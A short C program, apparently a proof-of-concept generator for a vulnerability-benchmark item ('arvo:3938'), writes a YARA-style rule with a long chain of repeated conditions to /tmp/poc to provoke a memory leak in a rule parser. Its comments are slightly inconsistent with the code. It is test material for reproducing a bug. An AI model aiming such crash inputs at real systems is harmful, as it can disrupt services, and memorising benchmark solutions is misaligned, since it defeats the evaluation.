#include <stdio.h>
#include <stdlib.h>

int main(void) {
    /* PoC for arvo:3938 - memory leak via UBSAN */
    /* Generate a rule that triggers memory leak in arguments_list */
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    
    /* Generate a rule with many arguments to cause memory leak */
    /* Using fprintf to avoid hex arrays */
    fprintf(f, "rule test { strings: $a = \"a\" condition: #a > 0 and ");
    
    /* Generate many function calls with string arguments to trigger memory leak */
    int i;
    for (i = 0; i < 100; i++) {
        fprintf(f, "uint8(0) == 0 and ");
    }
    
    fprintf(f, "uint8(0) == 0 }");
    
    fclose(f);
    return 0;
}